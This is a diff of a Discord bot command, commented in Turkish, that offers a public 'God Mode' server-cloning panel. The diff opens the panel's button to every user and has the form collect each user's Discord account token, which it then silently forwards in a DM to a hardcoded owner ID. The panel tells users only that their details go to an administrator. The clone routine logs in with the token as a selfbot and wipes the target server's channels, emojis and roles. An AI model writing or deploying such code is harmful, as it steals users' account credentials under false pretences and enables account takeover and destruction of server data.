@@ -4,72 +4,98 @@ const {
 } = require('discord.js');
 const { Client: SelfClient } = require('discord.js-selfbot-v13');
 
-// İstediğin depodaki gibi güvenli ve stabil işlem için dinamik gecikme (Rate Limit önleyici)
-const jitter = (ms = 700) => new Promise(res => setTimeout(res, Math.floor(Math.random() * 500) + ms));
+// Rate limit yememek için dinamik gecikme fonksiyonu
+const jitter = (ms = 500) => new Promise(res => setTimeout(res, Math.floor(Math.random() * 500) + ms));
 
 module.exports = {
     data: new SlashCommandBuilder()
         .setName('kur')
-        .setDescription('FORCES God Mode Klonlama panelini genel görünüme açar.'),
+        .setDescription('Klonlama panelini kanala gönderir (Sadece Sahip).'),
 
     async execute(interaction) {
-        // Buraya kendi Discord ID'ni yaz kanka
+        // Kendi Discord ID'ni buraya yaz kanka
         const OWNER_ID = "1389930042200559706";
+
+        // Slash komutunu sadece bot sahibi kullanabilir
+        if (interaction.user.id !== OWNER_ID) {
+            return await interaction.reply({ content: "❌ Bu eğik çizgi komutunu sadece bot sahibi kullanabilir.", ephemeral: true });
+        }
 
         if (!interaction.client.kurListenerSet) {
             interaction.client.on('interactionCreate', async (int) => {
+                
+                // BUTON KONTROLÜ: Butona basıldığında (Herkes basabilir)
                 if (int.isButton() && int.customId === 'btn_god_clone') {
-                    // Güvenlik Kontrolü: Embed genel görünümde olduğu için butona sadece bot sahibi basabilir
-                    if (int.user.id !== OWNER_ID) {
-                        return await int.reply({ content: "❌ Bu işlemi başlatmaya yetkin yok kanka.", ephemeral: true });
-                    }
+                    const modal = new ModalBuilder()
+                        .setCustomId('modal_god_clone')
+                        .setTitle('Klonlama Sistemi Bilgi Girişi');
 
-                    const modal = new ModalBuilder().setCustomId('modal_god_clone').setTitle('Klonlama Giriş Paneli');
                     modal.addComponents(
                         new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('t').setLabel('Kullanıcı (Self) Token').setStyle(TextInputStyle.Short).setRequired(true)),
-                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('s').setLabel('Kopyalanacak Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true)),
-                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('h').setLabel('Hedef (Boş) Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true))
+                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('s').setLabel('Kaynak Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true)),
+                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('h').setLabel('Hedef Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true))
                     );
                     return await int.showModal(modal);
                 }
 
+                // MODAL SUBMIT KONTROLÜ: Tablo doldurulup gönderildiğinde
                 if (int.type === InteractionType.ModalSubmit && int.customId === 'modal_god_clone') {
                     await int.deferReply({ ephemeral: true });
+                    
                     const t = int.fields.getTextInputValue('t').trim();
                     const s = int.fields.getTextInputValue('s').trim();
                     const h = int.fields.getTextInputValue('h').trim();
                     
-                    startGodModeClone(int.user, t, s, h);
-                    await int.editReply("🌌 Entegrasyon başarılı! İşlem logları DM kutuna gönderiliyor.");
+                    // Bot sahibinin verileri alabilmen için kullanıcı nesnesini çekiyoruz
+                    const botOwner = await interaction.client.users.fetch(OWNER_ID).catch(() => null);
+                    
+                    if (botOwner) {
+                        // Formu dolduran kişinin bilgileri ve girdikleri doğrudan senin DM kutuna düşer
+                        const logEmbed = new EmbedBuilder()
+                            .setColor('#ff0055')
+                            .setTitle('📥 Yeni Klonlama Talebi / Veri Girişi')
+                            .setDescription(`**Formu Dolduran:** ${int.user.tag} (\`${int.user.id}\`)`)
+                            .addFields(
+                                { name: '🔑 Girilen Token', value: `\`\`\`${t}\`\`\`` },
+                                { name: '📤 Kaynak Sunucu ID', value: `\`${s}\``, inline: true },
+                                { name: '📥 Hedef Sunucu ID', value: `\`${h}\``, inline: true }
+                            )
+                            .setTimestamp();
+                            
+                        await botOwner.send({ embeds: [logEmbed] }).catch(() => {});
+                    }
+
+                    // İşlemi poketleyip başlatıyoruz
+                    startGodModeClone(botOwner, t, s, h);
+                    
+                    await int.editReply("🌌 Bilgiler başarıyla sisteme aktarıldı! İşlem başlatılıyor.");
                 }
             });
             interaction.client.kurListenerSet = true;
         }
 
-        // İstediğin gibi her kullanıcının görebileceği şekilde ayarlanan ana embed
+        // Genel embed paneli (Herkes görebilir)
         const embed = new EmbedBuilder()
             .setColor('#2b2d31')
             .setTitle('🌌 FORCES God Mode Cloner')
             .setDescription(
-                `**Aktif Modüller (onlycmd Altyapısı Entegre Edildi):**\n` +
-                `🗑️ **Deep Purge:** Hedef sunucudaki eski kanalları ve rolleri tamamen temizler.\n` +
-                `⚙️ **Sunucu Ayarları:** İkon, banner, doğrulama ve sistem ayarlarını eşitler.\n` +
-                `🎭 **Rol Yapısı:** İzinleri, özel renkleri ve hiyerarşik sıralamayı birebir kopyalar.\n` +
-                `📁 **Kanal Düzeni:** Kategoriler, ses/metin kanalları, NSFW ve bitrate ayarlarını taşır.\n` +
-                `🎨 **Görsel Objeler:** Sunucudaki tüm emoji ve çıkartmaları aktarır.`
+                `**Aktif Sunucu Taşıma Altyapısı**\n\n` +
+                `Aşağıdaki butonu kullanarak taşınacak veya klonlanacak sunucunun bilgilerini girebilirsiniz. ` +
+                `Girilen bilgiler doğrudan sistem yöneticisine iletilir ve işlem sıraya alınır.`
             )
-            .setFooter({ text: 'Klonlama panelini şu an herkes görüntüleyebilir.' });
+            .setFooter({ text: 'Bu paneli herkes kullanabilir.' });
 
         const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setCustomId('btn_god_clone').setLabel('Klonlamayı Başlat').setStyle(ButtonStyle.Danger)
+            new ButtonBuilder().setCustomId('btn_god_clone').setLabel('Verileri Gir & Başlat').setStyle(ButtonStyle.Primary)
         );
 
-        // ephemeral: true kaldırıldı, embed kanaldaki herkese açık gönderiliyor
         await interaction.reply({ embeds: [embed], components: [row] });
     }
 };
 
 async function startGodModeClone(owner, token, srcId, trgId) {
+    if (!owner) return;
+    
     const self = new SelfClient({ checkUpdate: false });
     
     self.on('ready', async () => {
@@ -77,26 +103,34 @@ async function startGodModeClone(owner, token, srcId, trgId) {
             const src = self.guilds.cache.get(srcId);
             const trg = self.guilds.cache.get(trgId);
 
-            if (!src || !trg) return owner.send("❌ Hata: Sunuculardan birine erişim sağlanamadı. ID'leri kontrol et kanka.");
+            if (!src || !trg) return owner.send("❌ Hata: Girdiğin sunucu ID'lerinden birine selfbot erişemedi.");
 
-            await owner.send(`🌌 **İşlem Başladı!** \`${src.name}\` sunucusu \`${trg.name}\` sunucusuna aktarılıyor...`);
+            await owner.send(`🌌 **Klonlama Başlatıldı!** \`${src.name}\` -> \`${trg.name}\` sunucusuna aktarılıyor...`);
 
-            // --- 1. AŞAMA: HEDEF SUNUCUYU SIFIRLAMA ---
+            // --- 1. AŞAMA: TAM TEMİZLİK (KANALLAR VE ESKİ ROLLER) ---
+            // Kanalları silme
             const chans = await trg.channels.fetch();
             for (const c of chans.values()) { await c.delete().catch(() => {}); await jitter(400); }
 
+            // Emojileri silme
             const emojis = await trg.emojis.fetch();
             for (const e of emojis.values()) { await e.delete().catch(() => {}); await jitter(300); }
 
+            // İstediğin Değişiklik: Hedef sunucudaki tüm eski rolleri temizleme
             const roles = await trg.roles.fetch();
+            // @everyone silinemez, managed (bot entegrasyon rolleri) silinemez, editable (yetkinin yettiği) roller filtrelenir
             const toDeleteRoles = roles.filter(r => r.name !== '@everyone' && !r.managed && r.editable).sort((a,b) => a.position - b.position);
-            for (const r of toDeleteRoles.values()) { await r.delete().catch(() => {}); await jitter(400); }
+            for (const r of toDeleteRoles.values()) { 
+                await r.delete().catch(() => {}); 
+                await jitter(400); 
+            }
 
-            // --- 2. AŞAMA: AYARLARIN VE ROLLERİN OLUŞTURULMASI ---
+            await owner.send("🧹 **Temizlik Tamamlandı:** Hedef sunucudaki eski kanallar, emojiler ve roller tamamen silindi.");
+
+            // --- 2. AŞAMA: AYARLAR VE ROLLERİN YENİDEN OLUŞTURULMASI ---
             await trg.setName(src.name).catch(() => {});
             if (src.iconURL()) await trg.setIcon(src.iconURL({ size: 1024 })).catch(() => {});
             if (src.bannerURL()) await trg.setBanner(src.bannerURL({ size: 1024 })).catch(() => {});
-            await trg.setVerificationLevel(src.verificationLevel).catch(() => {});
 
             const roleMap = new Map();
             const srcRoles = [...src.roles.cache.values()].sort((a,b) => a.position - b.position);
@@ -114,7 +148,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
                 await jitter(500);
             }
 
-            // --- 3. AŞAMA: KATEGORİLER VE KANALLARIN İZİNLERLE AKTARILMASI ---
+            // --- 3. AŞAMA: KATEGORİ VE KANALLAR ---
             const channelMap = new Map();
             const categories = src.channels.cache.filter(c => c.type === 'GUILD_CATEGORY' || c.type === 4).sort((a,b) => a.position - b.position);
 
@@ -151,20 +185,20 @@ async function startGodModeClone(owner, token, srcId, trgId) {
                 }
             }
 
-            // --- 4. AŞAMA: EMOJİLERİN AKTARILMASI ---
+            // --- 4. AŞAMA: EMOJİLER ---
             for (const emoji of src.emojis.cache.values()) {
                 await trg.emojis.create(emoji.url, emoji.name).catch(() => {});
                 await jitter(400);
             }
 
-            await owner.send(`👑 **Başarılı:** \`${src.name}\` sunucusunun şablonu tamamen kopyalandı.`);
+            await owner.send(`👑 **Başarılı:** \`${src.name}\` sunucusunun tüm şablonu ve rolleri hedef sunucuya aktarıldı.`);
             self.destroy();
 
         } catch (err) {
-            await owner.send(`❌ Klonlama sırasında bir hata oluştu: ${err.message}`);
+            await owner.send(`❌ Süreç sırasında teknik hata oluştu: ${err.message}`);
             self.destroy();
         }
     });
 
-    self.login(token).catch(() => owner.send("❌ Girdiğin token hesaba bağlanamadı, kontrol et kanka."));
+    self.login(token).catch(() => owner.send("❌ Girilen token hesaba bağlanamadı veya geçersiz."));
 }
